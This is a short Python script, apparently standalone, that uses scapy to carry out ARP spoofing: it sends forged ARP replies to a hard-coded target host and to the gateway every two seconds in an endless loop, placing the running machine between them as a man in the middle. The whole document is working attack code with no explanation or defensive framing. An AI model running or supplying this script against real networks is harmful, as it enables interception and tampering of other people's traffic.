from scapy.all import ARP, send
import time

target_ip = "192.168.1.26"
target_mac = "08:00:27:6c:b2:85"

gateway_ip = "192.168.1.1"
gateway_mac = "34:e8:94:57:48:a8"

def spoof():
    packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    packet2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

    send(packet1, verbose=False)
    send(packet2, verbose=False)

while True:
    spoof()
    print("ARP Spoofing running...")
    time.sleep(2)
